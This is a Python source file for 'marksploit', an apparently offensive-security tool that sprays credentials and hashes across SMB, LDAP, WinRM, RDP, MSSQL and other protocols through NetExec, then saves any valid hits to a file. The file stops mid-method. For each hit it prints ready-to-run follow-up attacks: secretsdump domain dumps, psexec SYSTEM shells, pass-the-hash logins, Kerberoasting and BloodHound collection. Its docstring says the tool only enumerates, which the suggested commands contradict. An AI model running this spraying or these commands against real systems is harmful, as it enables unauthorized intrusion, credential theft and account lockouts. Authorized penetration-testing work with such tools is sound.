#!/usr/bin/env python3
"""
marksploit — credential spray & enumeration wrapper around NetExec (nxc)

Runs nxc across multiple protocols and credential pairs, surfaces hits with
suggested follow-up commands, and optionally outputs a ready-to-run shell
script.  Never exploits — enumeration only.

Requires: nxc (NetExec) on PATH.  pip install netexec
"""
import argparse
import ipaddress
import json
import os
import re
import shlex
import shutil
import signal
import socket
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Iterable

# ─── Tee — mirror stdout to file ───────────────────────────────────────
_ANSI_RE = re.compile(r"\033\[[0-9;]*[mABCDEFGHJKSTfnsulh]")


class Tee:
    """Mirror sys.stdout to a file with ANSI codes stripped."""
    def __init__(self, path: str) -> None:
        self._file   = open(path, "w", encoding="utf-8", errors="replace")
        self._stdout = sys.__stdout__
    def write(self, data: str) -> int:
        self._stdout.write(data)
        self._file.write(_ANSI_RE.sub("", data))
        return len(data)
    def flush(self) -> None:
        self._stdout.flush(); self._file.flush()
    def isatty(self) -> bool:
        return self._stdout.isatty()
    def fileno(self) -> int:
        return self._stdout.fileno()
    def close(self) -> None:
        sys.stdout = self._stdout
        self._file.flush(); self._file.close()


# ─── Colors ────────────────────────────────────────────────────────────
RED = GREEN = YELLOW = BLUE = CYAN = BOLD = DIM = RESET = ""
_COLOR_CODES = {
    "RED": "\033[91m", "GREEN": "\033[92m", "YELLOW": "\033[93m",
    "BLUE": "\033[94m", "CYAN": "\033[96m", "BOLD": "\033[1m",
    "DIM": "\033[2m",   "RESET": "\033[0m",
}

def configure_colors(no_color: bool) -> None:
    if no_color or not sys.stdout.isatty():
        return
    for name, code in _COLOR_CODES.items():
        globals()[name] = code


# ─── Protocol config ───────────────────────────────────────────────────
ALL_PROTOCOLS      = ["smb","ssh","ldap","ftp","wmi","winrm","rdp","vnc","mssql","nfs"]
LOCAL_AUTH_PROTOS  = {"smb","wmi","winrm","rdp","mssql"}
WINDOWS_PROTOS     = {"smb","winrm","wmi","rdp","mssql","ldap"}

PROTOCOL_PORTS = {
    "smb":445,"ssh":22,"ldap":389,"ftp":21,"wmi":135,
    "winrm":5985,"rdp":3389,"vnc":5900,"mssql":1433,"nfs":2049,
}

DEFAULT_WORKERS          = 15
DEFAULT_TARGET_WORKERS   = 3
NETEXEC_TIMEOUT          = 30
SUBPROCESS_TIMEOUT       = 45
PORT_PROBE_TIMEOUT       = 2.0
MAX_CONSECUTIVE_TIMEOUTS = 3
DEFAULT_MAX_CIDR_HOSTS   = 1024
DEFAULT_SPRAY_DELAY      = 30    # seconds between spray rounds
LOCKOUT_WARN_THRESHOLD   = 3     # warn if more creds than this in non-spray mode


# ─── Data classes ──────────────────────────────────────────────────────
class AuthType(str, Enum):
    PASSWORD = "password"
    HASH     = "hash"
    KERBEROS = "kerberos"


@dataclass(frozen=True)
class Cred:
    user: str; secret: str; auth_type: AuthType
    @property
    def is_hash(self) -> bool:     return self.auth_type == AuthType.HASH
    @property
    def is_kerberos(self) -> bool: return self.auth_type == AuthType.KERBEROS


@dataclass
class Success:
    protocol: str; local_auth: bool; domain: str; user: str
    secret: str; auth_type: AuthType
    is_admin: bool = False; is_guest: bool = False; raw_message: str = ""
    @property
    def is_hash(self) -> bool:     return self.auth_type == AuthType.HASH
    @property
    def is_kerberos(self) -> bool: return self.auth_type == AuthType.KERBEROS
    @property
    def scope(self) -> str:  return "local" if self.local_auth else "domain"
    @property
    def label(self) -> str:  return f"{self.protocol.upper()} ({self.scope})"


@dataclass
class TargetResult:
    target: str
    real_ip: str = ""; hostname: str = ""; domain: str = ""
    is_dc: bool = False; elapsed: float = 0.0
    open_protocols:   list[str]  = field(default_factory=list)
    closed_protocols: list[str]  = field(default_factory=list)
    successes:        list[Success] = field(default_factory=list)
    guests:           list[Success] = field(default_factory=list)
    anon_smb: bool = False
    anon_smb_lines:   list[str]  = field(default_factory=list)
    share_lines:      list[str]  = field(default_factory=list)   # auto-enum shares
    protocol_lines:   dict[str, list[tuple[str,str]]] = field(default_factory=dict)
    target_info: str = ""; scanned: bool = True; skipped_reason: str = ""


# ─── CME-style formatter ───────────────────────────────────────────────
_PROTO_W = 12; _IP_W = 16; _PORT_W = 7; _HOST_W = 17

def _cme_prefix(proto: str, ip: str, port: int|str, hostname: str) -> str:
    return (f"{proto.upper():<{_PROTO_W}}"
            f"{ip:<{_IP_W}}"
            f"{str(port):<{_PORT_W}}"
            f"{(hostname or ip)[:(_HOST_W-1)]:<{_HOST_W}}")

def cme_line(proto,ip,port,hostname,marker,msg,color="") -> str:
    prefix = _cme_prefix(proto,ip,port,hostname)
    body   = f"{marker} {msg}"
    return f"{prefix}{color}{body}{RESET}" if color else f"{prefix}{body}"

def _marker_color(marker: str) -> str:
    return {"[+]":GREEN,"[-]":RED,"[*]":CYAN,"[!]":YELLOW}.get(marker,"")

def print_cme(proto,ip,port,hostname,marker,msg) -> None:
    print(cme_line(proto,ip,port,hostname,marker,msg,color=_marker_color(marker)),flush=True)

def print_info(marker: str, msg: str, indent: int = 0) -> None:
    color = _marker_color(marker)
    body  = f"{'  '*indent}{marker} {msg}"
    print(f"{color}{body}{RESET}" if color else body, flush=True)

_SEP = f"{DIM}{'─'*64}{RESET}"


# ─── nxc output parsing ────────────────────────────────────────────────
def parse_nxc_line(line: str) -> tuple[str|None,str]:
    for m in ("[+]","[-]","[*]","[!]"):
        idx = line.find(m)
        if idx != -1:
            return m, line[idx+4:].strip()
    return None, line.strip()

def parse_success_message(msg: str) -> tuple[str,str,str,bool,bool]:
    cleaned = msg.strip()
    is_admin = is_guest = False
    m = re.search(r"\s*\(([^()]*)\)\s*$", cleaned)
    if m:
        flag = m.group(1).lower()
        if   "guest" in flag:                 is_guest = True
        elif "pwn3d" in flag or "adm" in flag: is_admin = True
        cleaned = cleaned[:m.start()].rstrip()
    if not cleaned or ":" not in cleaned:
        return "", cleaned, "", is_admin, is_guest
    head, secret = cleaned.split(":", 1)
    if "\\" in head:
        domain, user = head.split("\\", 1)
    else:
        domain, user = "", head
    return domain.strip(), user.strip(), secret, is_admin, is_guest

def extract_ipv4(text: str) -> str|None:
    m = re.search(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", text)
    return m.group(0) if m else None

def looks_like_dc(info: str) -> bool:
    if not info: return False
    m = re.search(r"name:([^\s)]+)", info, re.IGNORECASE)
    if not m: return False
    return bool(re.search(r"\bdc\d*\b|^dc|pdc|addc", m.group(1).lower()))

def extract_ssh_hostname(info: str) -> str:
    """Extract hostname from SSH banners if possible."""
    patterns = [
        r"name:([^\s)]+)",
        r"hostname[:=]\s*([^\s]+)",
        r"server[:=]\s*([^\s]+)",
    ]
    for pattern in patterns:
        m = re.search(pattern, info, re.IGNORECASE)
        if m:
            return m.group(1).upper()
    return ""

def extract_hostname(info: str) -> str:
    if not info:
        return ""
    m = re.search(r"name:([^\s)]+)", info, re.IGNORECASE)
    if m:
        return m.group(1).upper()
    return extract_ssh_hostname(info)

def extract_domain(info: str) -> str:
    m = re.search(r"domain:([^\s)]+)", info, re.IGNORECASE)
    return m.group(1) if m else ""


# ─── Shell-safe quoting ────────────────────────────────────────────────
def q(v: str|None) -> str:
    if v is None or v == "": return "''"
    return shlex.quote(str(v))


# ─── Suggested commands ────────────────────────────────────────────────
def build_suggestions(s: Success, ip: str, hostname: str,
                      is_dc: bool, extra_hash: str|None) -> list[tuple[str,str]]:
    proto  = s.protocol
    user   = s.user or ""
    domain = s.domain or ""
    secret = s.secret or ""
    pth_hash = secret if s.is_hash else (extra_hash or "")

    qip = q(ip); quser = q(user); qdom = q(domain) if domain else "''"
    qpw = q(secret) if not s.is_hash else "''"
    if domain:
        url_pw   = f"{domain}/{user}:{secret}@{ip}"
        url_nopw = f"{domain}/{user}@{ip}"
    else:
        url_pw   = f"{user}:{secret}@{ip}"
        url_nopw = f"{user}@{ip}"
    qurl_pw   = q(url_pw);   qurl_nopw = q(url_nopw)
    qfqdn     = q(f"{hostname}.{domain}" if hostname and domain else (hostname or ip))
    qhash     = q(pth_hash) if pth_hash else "''"
    if domain and not s.is_hash:  qsmb_user = q(f"{domain}\\{user}%{secret}")
    elif not s.is_hash:           qsmb_user = q(f"{user}%{secret}")
    else:                         qsmb_user = q(f"{domain}\\{user}" if domain else user)

    e: list[tuple[str,str]] = []

    if s.auth_type == AuthType.PASSWORD:
        if proto == "smb":
            if is_dc:
                e += [("crackmapexec --shares",
                           f"crackmapexec smb {qip} -u {quser} -p {qpw} --shares"),
                      ("secretsdump -just-dc",
                           f"impacket-secretsdump -just-dc {qurl_pw}"),
                      ("smbclient (interactive)",
                           f"smbclient //{ip}/<SHARE> -U {qsmb_user}")]
            else:
                e += [("enum4linux-ng",
                           f"enum4linux-ng -A -u {quser} -p {qpw} {qip}"),
                      ("crackmapexec --shares",
                           f"crackmapexec smb {qip} -u {quser} -p {qpw} --shares"),
                      ("secretsdump (SAM+LSA)",
                           f"impacket-secretsdump {qurl_pw}"),
                      ("psexec (SYSTEM shell)",
                           f"impacket-psexec {qurl_pw}"),
                      ("smbclient (interactive)",
                           f"smbclient //{ip}/<SHARE> -U {qsmb_user}")]
        elif proto == "winrm":
            e.append(("evil-winrm", f"evil-winrm -i {qip} -u {quser} -p {qpw}"))
        elif proto == "wmi":
            e.append(("wmiexec",    f"impacket-wmiexec {qurl_pw}"))
        elif proto == "rdp":
            e.append(("xfreerdp3",
                       f"xfreerdp3 /u:{quser} /p:{qpw} /d:{qdom} /v:{qip} "
                       f"/dynamic-resolution /drive:share,/home/kali /cert:ignore"))
        elif proto == "mssql":
            e.append(("mssqlclient",
                       f"impacket-mssqlclient {qurl_pw} -windows-auth"))
        elif proto == "ldap" and is_dc:
            e += [("kerbrute userenum",
                       f"kerbrute userenum --dc {qip} -d {qdom} "
                       f"/usr/share/seclists/Usernames/Names/names.txt"),
                  ("AS-REP roast",
                       f"impacket-GetNPUsers {qdom}/{quser}:{qpw} "
                       f"-request -format hashcat -outputfile asrep.hash -dc-ip {qip}"),
                  ("Kerberoast",
                       f"impacket-GetUserSPNs -request -dc-ip {qip} "
                       f"{qdom}/{quser}:{qpw} -outputfile kerb.hash"),
                  ("BloodHound",
                       f"bloodhound-python -u {quser} -p {qpw} -d {qdom} "
                       f"-dc {qfqdn} -ns {qip} -c All --zip"),
                  ("ldapdomaindump",
                       f"ldapdomaindump -u "
                       f"{q(domain+chr(92)+user) if domain else quser} "
                       f"-p {qpw} {qip}")]
        elif proto == "ldap":
            e.append(("ldapdomaindump",
                       f"ldapdomaindump -u "
                       f"{q(domain+chr(92)+user) if domain else quser} "
                       f"-p {qpw} {qip}"))
        elif proto == "ssh":
            e.append(("ssh",
                       f"ssh -o UserKnownHostsFile=/dev/null "
                       f"-o StrictHostKeyChecking=no {q(user+'@'+ip)}"))
        elif proto == "ftp":
            e += [("ftp (active)",   f"ftp -A {qip}"),
                  ("wget recursive", f"wget -r ftp://{q(user)}:{q(secret)}@{ip}/")]
        elif proto == "vnc":
            e.append(("vncviewer", f"vncviewer {qip}"))
        elif proto == "nfs":
            e += [("showmount",   f"showmount -e {qip}"),
                  ("mount NFS",   f"sudo mkdir -p /mnt/nfs && "
                                  f"sudo mount -t nfs -o nolock,vers=3 "
                                  f"{ip}:<EXPORT> /mnt/nfs")]
    elif s.auth_type == AuthType.HASH:
        ha = q(pth_hash) if pth_hash else "NT"
        if proto == "smb":
            if is_dc:
                e += [("crackmapexec --shares [PtH]",
                           f"crackmapexec smb {qip} -u {quser} -H {qhash} --shares"),
                      ("secretsdump -just-dc [PtH]",
                           f"impacket-secretsdump -just-dc {qurl_nopw} -hashes :{ha}"),
                      ("psexec [PtH]",
                           f"impacket-psexec {qurl_nopw} -hashes :{ha}")]
            else:
                e += [("crackmapexec --shares [PtH]",
                           f"crackmapexec smb {qip} -u {quser} -H {qhash} --shares"),
                      ("secretsdump [PtH]",
                           f"impacket-secretsdump {qurl_nopw} -hashes :{ha}"),
                      ("psexec [PtH]",
                           f"impacket-psexec {qurl_nopw} -hashes :{ha}"),
                      ("wmiexec [PtH]",
                           f"impacket-wmiexec {qurl_nopw} -hashes :{ha}")]
        elif proto == "winrm":
            e.append(("evil-winrm [PtH]",
                       f"evil-winrm -i {qip} -u {quser} -H {qhash}"))
        elif proto == "wmi":
            e.append(("wmiexec [PtH]",
                       f"impacket-wmiexec {qurl_nopw} -hashes :{ha}"))
        elif proto == "rdp":
            e.append(("xfreerdp3 [PtH]",
                       f"xfreerdp3 /u:{quser} /pth:{qhash} /d:{qdom} /v:{qip} "
                       f"/dynamic-resolution /drive:share,/home/kali /cert:ignore"))
        elif proto == "mssql":
            e.append(("mssqlclient [PtH]",
                       f"impacket-mssqlclient {qurl_nopw} -hashes :{ha} -windows-auth"))
        elif proto == "ldap" and is_dc:
            e += [("BloodHound [PtH]",
                       f"bloodhound-python -u {quser} --hashes :{ha} "
                       f"-d {qdom} -dc {qfqdn} -ns {qip} -c All --zip"),
                  ("Kerberoast [PtH]",
                       f"impacket-GetUserSPNs -request -dc-ip {qip} "
                       f"-hashes :{ha} {qdom}/{quser} -outputfile kerb.hash")]
        elif proto == "ldap":
            e.append(("getTGT",
                       f"impacket-getTGT {qdom}/{quser} -hashes :{ha}"))
    elif s.auth_type == AuthType.KERBEROS:
        if proto == "smb":
            e.append(("psexec -k", f"impacket-psexec -k -no-pass {qurl_nopw}"))
            if is_dc:
                e.append(("secretsdump -k",
                           f"impacket-secretsdump -just-dc -k -no-pass {qurl_nopw}"))
        elif proto == "winrm":
            e.append(("evil-winrm -r",
                       f"evil-winrm -i {qip} -u {quser} -r {qdom}"))
        elif proto == "ldap" and is_dc:
            e.append(("BloodHound -k",
                       f"bloodhound-python -u {quser} -k --no-pass "
                       f"-d {qdom} -dc {qfqdn} -ns {qip} -c All --zip"))
    return e


# ─── Display ───────────────────────────────────────────────────────────
def print_suggested_commands(result: TargetResult, extra_hash: str|None) -> None:
    if not result.successes:
        return
    ip   = result.real_ip or result.target
    host = result.hostname or ip
    dc_note = " [DC]" if result.is_dc else ""

    def sort_key(s: Success) -> tuple[int,int]:
        try: return (ALL_PROTOCOLS.index(s.protocol), int(s.local_auth))
        except ValueError: return (len(ALL_PROTOCOLS), int(s.local_auth))

    seen: set[tuple[str,AuthType]] = set()
    blocks: list[tuple[str,list[tuple[str,str]]]] = []
    for s in sorted(result.successes, key=sort_key):
        k = (s.protocol, s.auth_type)
        if k in seen: continue
        seen.add(k)
        try:
            entries = build_suggestions(s, ip=ip, hostname=result.hostname,
                                        is_dc=result.is_dc, extra_hash=extra_hash)
        except Exception as exc:
            entries = [("error", f"# builder failed: {exc}")]
        if entries:
            hdr = s.protocol.upper()
            if s.auth_type == AuthType.HASH:      hdr += "/PtH"
            elif s.auth_type == AuthType.KERBEROS: hdr += "/Kerberos"
            blocks.append((hdr, entries))

    if not blocks:
        return
    print_info("[*]", f"suggested next steps  {host}{dc_note}")
    print(flush=True)
    for proto_hdr, entries in blocks:
        print(f"  [{proto_hdr}]", flush=True)
        for sub_label, cmd in entries:
            print(f"    # {sub_label}", flush=True)
            print(f"    {cmd}",        flush=True)
        print(flush=True)


def print_target_block(result: TargetResult, extra_hash: str|None,
                       verbose: bool) -> None:
    ip   = result.real_ip or result.target
    host = result.hostname or result.target

    has_hits   = bool(result.successes or result.guests or result.anon_smb)
    has_errors = any(m == "[!]"
                     for lines in result.protocol_lines.values()
                     for m, _ in lines)
    has_info = any(m == "[*]"
                   for lines in result.protocol_lines.values()
                   for m, _ in lines)
    if not has_hits and not has_errors and not has_info and not verbose:
        return

    print(f"\n\n{_SEP}", flush=True)
    print(flush=True)

    if result.target_info:
        dc_flag = " [DC]" if result.is_dc else ""
        print_cme("SMB", ip, 445, host, "[*]", result.target_info + dc_flag)
    else:
        proto = (result.open_protocols[0] if result.open_protocols else "smb").upper()
        port  = PROTOCOL_PORTS.get(result.open_protocols[0]
                                   if result.open_protocols else "smb", 0)
        print_cme(proto, ip, port, host or ip, "[*]", ip)
    print(flush=True)

    def iprint(marker: str, msg: str, indent: int = 1) -> None:
        color = _marker_color(marker)
        body  = f"{'  '*indent}{marker} {msg}"
        print(f"{color}{body}{RESET}" if color else body, flush=True)

    def sort_key(s: Success) -> tuple[int,int]:
        try: return (ALL_PROTOCOLS.index(s.protocol), int(s.local_auth))
        except ValueError: return (len(ALL_PROTOCOLS), int(s.local_auth))

    all_hits = sorted(result.successes, key=sort_key)
    if all_hits:
        for s in all_hits:
            scope = "local" if s.local_auth else "domain"
            auth  = s.auth_type.value if s.auth_type != AuthType.PASSWORD else "password"
            tag   = f"{s.protocol.upper()}/{scope}/{auth}"
            if   s.is_guest: qual = f"  {YELLOW}[guest — enumerate shares]{RESET}"
            elif s.is_admin: qual = f"  {GREEN}{BOLD}[ADMIN — Pwn3d!]{RESET}"
            else:            qual = f"  {GREEN}[valid]{RESET}"
            iprint("[+]", f"{s.raw_message}   [{tag}]{qual}")
        print(flush=True)

    seen_info: set[tuple[str, str]] = set()
    for proto in ALL_PROTOCOLS:
        for scope in (False, True):
            key   = f"{proto}-{'local' if scope else 'domain'}"
            lines = result.protocol_lines.get(key)
            if not lines: continue
            sn = " (local)" if scope else ""
            for marker, msg in lines:
                if marker == "[!]":               iprint("[!]", msg + sn)
                elif marker == "[-]" and verbose: iprint("[-]", msg + sn)
                elif marker == "[*]":
                    info_key = (proto, msg)
                    if info_key in seen_info:
                        continue
                    seen_info.add(info_key)
                    iprint("[*]", f"{proto.upper()} {msg}" + sn)

    if result.anon_smb:
        iprint("[*]", "anonymous SMB — next steps")
        print(flush=True)
        for label, cmd in [
            ("list shares",           f"smbclient -L //{ip} -N"),
            ("connect to a share",    f"smbclient //{ip}/<SHARE> -N"),
            ("enum4linux-ng",         f"enum4linux-ng -A {ip}"),
            ("crackmapexec shares",   f"crackmapexec smb {ip} -u '' -p '' --shares"),
            ("recursive pull SYSVOL", f"smbclient //{ip}/SYSVOL -N -c "
                                      f"'recurse ON; prompt OFF; mget *'"),
        ]:
            print(f"      # {label}", flush=True)
            print(f"      {cmd}",    flush=True)
            print(flush=True)

    if result.share_lines:
        iprint("[*]", "shares (auto-enumerated)")
        print(flush=True)
        for line in result.share_lines:
            print(f"      {line}", flush=True)
        print(flush=True)

    if result.guests:
        iprint("[!]", "guest mapping  (map to guest = bad user, not real auth)")
        for s in result.guests:
            iprint("[!]", s.raw_message + (" (local)" if s.local_auth else ""), indent=2)
        print(flush=True)

    if result.successes:
        print(flush=True)
        print_suggested_commands(result, extra_hash)


# ─── Input handling ────────────────────────────────────────────────────
def read_value_or_file(source: str) -> list[str]:
    if os.path.isfile(source):
        try:
            with open(source) as f:
                return [l.strip() for l in f if l.strip()]
        except OSError as exc:
            raise ValueError(f"Cannot read '{source}': {exc}") from exc
    return [source]

def expand_targets(specs: Iterable[str], max_hosts: int) -> list[str]:
    out: list[str] = []; seen: set[str] = set()
    for raw in specs:
        spec = raw.strip()
        if not spec: continue
        if "/" in spec:
            try:
                net = ipaddress.ip_network(spec, strict=False)
            except ValueError:
                if spec not in seen: seen.add(spec); out.append(spec)
                continue
            if net.num_addresses > max_hosts:
                raise ValueError(f"{spec} expands to {net.num_addresses} hosts "
                                 f"(cap: {max_hosts}). Use --max-cidr-hosts.")
            hosts = ([net.network_address] if net.num_addresses == 1
                     else list(net.hosts()))
            for h in hosts:
                addr = str(h)
                if addr not in seen: seen.add(addr); out.append(addr)
        else:
            if spec not in seen: seen.add(spec); out.append(spec)
    return out

def parse_protocol_list(spec: str|None) -> list[str]:
    if not spec: return list(ALL_PROTOCOLS)
    items   = {s.strip().lower() for s in spec.split(",") if s.strip()}
    unknown = items - set(ALL_PROTOCOLS)
    if unknown:
        raise ValueError(f"Unknown protocol(s): {', '.join(sorted(unknown))}. "
                         f"Valid: {', '.join(ALL_PROTOCOLS)}")
    return [p for p in ALL_PROTOCOLS if p in items]


# ─── Port probe ────────────────────────────────────────────────────────
def tcp_probe(host: str, port: int) -> bool:
    try:
        with socket.create_connection((host, port), timeout=PORT_PROBE_TIMEOUT):
            return True
    except (OSError, socket.timeout):
        return False

def probe_protocols(host: str, protos: list[str]) -> list[str]:
    open_set: set[str] = set()
    with ThreadPoolExecutor(max_workers=10) as pool:
        futs = {pool.submit(tcp_probe, host, PROTOCOL_PORTS[p]): p for p in protos}
        for f in as_completed(futs):
            try:
                if f.result(): open_set.add(futs[f])
            except Exception: pass
    return [p for p in protos if p in open_set]


# ─── Credential / script file output ───────────────────────────────────
CREDS_HEADER = (
    "# marksploit valid credentials\n"
    "# target\tprotocol\tscope\tdomain\tuser\tauth_type\tsecret\tprivilege\ttimestamp\n"
)

def append_creds(path: str, result: TargetResult) -> None:
    if not result.successes: return
    is_new = not os.path.exists(path)
    now    = datetime.now().isoformat(timespec="seconds")
    with open(path, "a") as f:
        if is_new: f.write(CREDS_HEADER)
        for s in result.successes:
            f.write("\t".join([
                result.real_ip or result.target,
                s.protocol, s.scope,
                s.domain or "-", s.user,
                s.auth_type.value, s.secret,
                "admin" if s.is_admin else "user",
                now,
            ]) + "\n")


# ─── Orchestrator ──────────────────────────────────────────────────────
class MarkSploit:
    def __init__(self, *, targets, users, passwords, hashes, kerberos,
                 protocols, log_file, creds_file, json_out, save_file, script_file,
                 workers, target_workers, quiet, verbose, debug, no_port_probe, extra_hash,
                 spray, spray_delay, auto_enum, timeout_skip):
        self.targets      = targets
        self.users        = users
        self.passwords    = passwords
        self.hashes       = hashes
        self.kerberos     = kerberos
        self.protocols    = protocols
        self.log_file     = log_file
        self.creds_file   = creds_file
        self.json_out     = json_out
        self.save_file    = save_file
        self.script_file  = script_file
        self.workers      = workers
        self.target_workers = max(1, target_workers)
        self.quiet        = quiet
        self.verbose      = verbose
        self.debug        = debug
        self.no_port_probe = no_port_probe
        self.extra_hash   = extra_hash
        self.spray        = spray
        self.spray_delay  = spray_delay
        self.auto_enum    = auto_enum
        self.timeout_skip = timeout_skip

        self.creds = self._build_creds()
        if not self.creds:
            raise ValueError("No credentials to test (need -p, -H, or -k).")

        self._stop        = threading.Event()
        self._procs_lock  = threading.Lock()
        self._procs: set[subprocess.Popen] = set()
        self._progress_lock = threading.Lock()
        self._done = self._total = self._scan_done = 0
        self._scan_total = len(targets)
        self._current_proto = ""
        self.identity_lock = threading.Lock()

    def _build_creds(self) -> list[Cred]:
        if self.kerberos:
            return [Cred(u, "", AuthType.KERBEROS) for u in self.users]
        pairs: list[Cred] = []
        pairs += [Cred(u, p, AuthType.PASSWORD) for u in self.users for p in self.passwords]
        pairs += [Cred(u, h, AuthType.HASH)     for u in self.users for h in self.hashes]
        return pairs

    def cancel(self) -> None:
        self._stop.set()
        with self._procs_lock:
            for proc in list(self._procs):
                try: proc.terminate()
                except OSError: pass

    # ── progress ──────────────────────────────────────────────────────
    @staticmethod
    def _bar(done: int, total: int, width: int) -> str:
        if total <= 0: return "░" * width
        filled = int(width * done / total)
        return "█" * filled + "░" * (width - filled)

    def _redraw(self) -> None:
        overall = ""
        if self._scan_total > 1:
            ob = self._bar(self._scan_done, self._scan_total, 20)
            overall = f"{DIM}{ob}{RESET} {self._scan_done}/{self._scan_total} hosts"
        current = ""
        if self._total > 0:
            tb = self._bar(self._done, self._total, 15)
            label = f"  checking {self._current_proto}" if self._current_proto else ""
            current = (f"  {DIM}│{RESET}  {DIM}{tb} "
                       f"{self._done}/{self._total} protos{label}{RESET}")
        elif self._current_proto:
            current = f"  {DIM}│ scanning {self._current_proto}{RESET}"
        if not overall and not current: return
        sys.stderr.write(f"\r\033[K  {overall}{current}  ")
        sys.stderr.flush()

    def _tick(self, n: int = 1) -> None:
        with self._progress_lock:
            self._done += n; self._redraw()

    def _clear_progress(self) -> None:
        sys.stderr.write("\r\033[K"); sys.stderr.flush()

    def _say(self, proto, ip, port, host, marker, msg, block_key: str = "") -> None:
        with self._progress_lock:
            self._clear_progress()
            self._redraw()

    # ── subprocess ────────────────────────────────────────────────────
    def _run_proc(self, cmd: list[str], timeout: float) -> tuple[str,str,bool]:
        if self._stop.is_set(): raise InterruptedError()
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, text=True)
        except FileNotFoundError as exc:
            return "", f"executable not found: {exc.filename}", False
        with self._procs_lock: self._procs.add(proc)
        try:
            try:
                out, err = proc.communicate(timeout=timeout)
                return out or "", err or "", False
            except subprocess.TimeoutExpired:
                proc.kill()
                try: proc.communicate(timeout=2)
                except subprocess.TimeoutExpired: pass
                return "", "", True
        finally:
            with self._procs_lock: self._procs.discard(proc)

    def _nxc_cmd(self, proto, target, cred, local_auth) -> list[str]:
        cmd = ["nxc", proto, target, "-u", cred.user]
        if cred.is_kerberos: cmd.append("--use-kcache")
        elif cred.is_hash:   cmd.extend(["-H", cred.secret])
        else:                cmd.extend(["-p", cred.secret])
        if local_auth:       cmd.append("--local-auth")
        cmd.extend(["--timeout", str(NETEXEC_TIMEOUT), "--log", self.log_file])
        return cmd

    # ── scan one (protocol, scope) ─────────────────────────────────────
    def _scan_protocol(self, proto, target, local_auth,
                       shared_identity,
                       host_skip: threading.Event,
                       show_progress: bool = True
                       ) -> tuple[list[tuple[str,str]], list[Success], str]:
        lines: list[tuple[str,str]] = []
        successes: list[Success]    = []
        target_info = ""
        consecutive_timeouts = 0
        scope_label = "local" if local_auth else "domain"
        port = PROTOCOL_PORTS.get(proto, 0)
        had_output = False

        for cred_idx, cred in enumerate(self.creds):
            if self._stop.is_set() or host_skip.is_set():
                break
            if cred.is_hash     and proto not in WINDOWS_PROTOS: continue
            if cred.is_kerberos and proto not in WINDOWS_PROTOS: continue

            if show_progress:
                with self._progress_lock:
                    self._current_proto = f"{proto.upper()}/{scope_label}"
                    self._redraw()

            cmd = self._nxc_cmd(proto, target, cred, local_auth)
            try:
                stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
            except InterruptedError:
                break

            if timed_out:
                consecutive_timeouts += 1
                if consecutive_timeouts >= MAX_CONSECUTIVE_TIMEOUTS:
                    msg = f"{MAX_CONSECUTIVE_TIMEOUTS} consecutive timeouts — skipped"
                    lines.append(("[!]", msg))
                    with self.identity_lock:
                        live_ip = shared_identity["real_ip"] or target
                        live_host = shared_identity["hostname"] or target
                    if show_progress:
                        self._say(proto, live_ip, port, live_host, "[!]", msg, target)
                    if self.timeout_skip:
                        host_skip.set()   # tell sibling protocols to bail out too
                    break
                continue
            consecutive_timeouts = 0

            for raw in stdout.split("\n"):
                marker, msg = parse_nxc_line(raw.strip())
                if marker:
                    had_output = True

                discovered_ip = extract_ipv4(msg)
                if discovered_ip:
                    with self.identity_lock:
                        shared_identity["real_ip"] = discovered_ip

                discovered_host = extract_hostname(msg)
                if discovered_host:
                    with self.identity_lock:
                        shared_identity["hostname"] = discovered_host

                discovered_domain = extract_domain(msg)
                if discovered_domain:
                    with self.identity_lock:
                        shared_identity["domain"] = discovered_domain

                if marker == "[*]":
                    lines.append((marker, msg))
                    if not target_info: target_info = msg
                elif marker == "[+]":
                    sn = f" ({scope_label})" if local_auth else ""
                    lines.append((marker, msg))
                    domain, user, secret, is_admin, is_guest = parse_success_message(msg)
                    if not secret: secret = cred.secret; user = user or cred.user
                    successes.append(Success(
                        protocol=proto, local_auth=local_auth,
                        domain=domain, user=user, secret=secret,
                        auth_type=cred.auth_type,
                        is_admin=is_admin, is_guest=is_guest, raw_message=msg))
                    with self.identity_lock:
                        live_ip = shared_identity["real_ip"] or target
                        live_host = shared_identity["hostname"] or target
                    if show_progress:
                        self._say(proto, live_ip, port, live_host, "[+]", msg + sn, target)
                elif marker in ("[-]", "[!]"):
                    lines.append((marker, msg))

            if stderr and not stdout:
                for raw in stderr.split("\n"):
                    if raw.strip(): lines.append(("[-]", raw.strip()))
        if not lines and proto in self.protocols:
            message = f"{proto.upper()} service detected"
            if not had_output:
                message += " (no nxc output)"
            lines.append(("[*]", message))
        return lines, successes, target_info

    # ── anon SMB probe ─────────────────────────────────────────────────
    def _scan_anon_smb(self, target, target_ip, hostname,
                       show_progress: bool = True) -> tuple[list[str],bool]:
        cmd = ["nxc","smb",target,"-u","","-p","",
               "--timeout",str(NETEXEC_TIMEOUT),"--log",self.log_file]
        try:
            stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
        except InterruptedError:
            return [], False
        if timed_out: return ["[!] Anonymous SMB check timed out"], False
        out_lines: list[str] = []; success = False
        for raw in stdout.split("\n"):
            line = raw.strip()
            if not line: continue
            out_lines.append(line)
            marker, msg = parse_nxc_line(line)
            if marker == "[+]":
                success = True
                if show_progress:
                    self._say("SMB", target_ip, 445, hostname, "[+]",
                              msg + " (anonymous)", target)
        if stderr and not stdout:
            for raw in stderr.split("\n"):
                if raw.strip(): out_lines.append(raw.strip())
        return out_lines, success

    # ── auto-enum shares ───────────────────────────────────────────────
    def _auto_enum_shares(self, ip: str, hostname: str) -> list[str]:
        """Run nxc smb --shares with null session and return share lines."""
        cmd = ["nxc","smb",ip,"-u","","-p","","--shares",
               "--timeout",str(NETEXEC_TIMEOUT)]
        try:
            stdout, _, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
        except InterruptedError:
            return []
        if timed_out: return ["[!] share enum timed out"]
        lines = []
        for raw in stdout.split("\n"):
            marker, msg = parse_nxc_line(raw.strip())
            if marker in ("[+]","[*]") and ("READ" in msg or "WRITE" in msg or
                                             "SHARE" in msg.upper() or
                                             "print" in msg.lower()):
                lines.append(msg)
        return lines

    # ── one target ─────────────────────────────────────────────────────
    def _scan_target(self, target: str,
                     preprobed_protos: list[str]|None = None,
                     show_progress: bool = True) -> TargetResult:
        result = TargetResult(target=target)

